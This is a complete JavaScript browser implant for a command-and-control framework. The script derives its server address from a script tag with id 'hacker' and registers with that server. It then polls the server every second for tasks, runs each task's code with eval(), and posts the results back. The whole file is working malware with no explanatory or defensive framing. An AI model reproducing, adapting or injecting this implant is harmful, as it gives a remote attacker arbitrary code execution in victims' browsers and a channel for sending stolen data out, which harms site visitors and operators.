var clientid = null;
var scriptsrc = document.getElementById("hacker").getAttribute("src");
var c2server = scriptsrc.substring(0, scriptsrc.length - 11);

function sendOutput(taskid,message){
     console.debug(message); //log output locally
    var taskCompleteRequest = new XMLHttpRequest();
                    taskCompleteRequest.onreadystatechange = function () {
                        if (taskCompleteRequest.readyState == 4 && taskCompleteRequest.status == 201) {
                            console.debug("[*] Message sent: " + message)
                        }
                    };
                    taskCompleteRequest.open("POST", c2server + "/api/client/"+String(clientid)+"/task/"+String(taskid)+"/output", true);
                    taskCompleteRequest.setRequestHeader("Content-type","application/json");
                    var taskoutput = {tasks:[{output:String(message)}]}
                    var outputjson = JSON.stringify(taskoutput);
                    taskCompleteRequest.send(outputjson); //log output remotely
}
function run() {
    function register() {
        //register client with server in order to obtain client id
        console.debug("[*] registering client with c2server at:" + c2server + "/api/register");
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function () {
            if (xhttp.readyState == 4 && xhttp.status == 201) {
                var jsondata = JSON.parse(xhttp.responseText);
                clientid = jsondata.clientid;
                console.debug("[*] registered client id: " + clientid)
            }
        };
        xhttp.open("GET", c2server + "/api/register", true);
        xhttp.send();
    }
    function getTasks() {
        var getTaskRequest = new XMLHttpRequest();
        getTaskRequest.onreadystatechange = function () {
            if (getTaskRequest.readyState == 4 && getTaskRequest.status == 201) {
                var jsondata = JSON.parse(getTaskRequest.responseText);
                for (var i in jsondata.tasks) {
                    var task =  jsondata.tasks[i];
                    console.debug("[*] Received task " + task.id + ": " + task.input)
                    try{
                        var cmdout = eval(task.input); //do the task
                        if (task.input.includes('sendOutput') == false){
                            sendOutput(task.id,cmdout);
                        }
                    }
                    catch(err){
                        sendOutput(task.id,err);
                    }
                    
                }
            }
        };
        getTaskRequest.open("GET", c2server + "/api/tasks/" + clientid, true);
        getTaskRequest.send();
    }

    if (clientid == null) {
        register();
    }
    console.debug("[*] ping")
    getTasks();
    setTimeout(run, 1000);
}
run();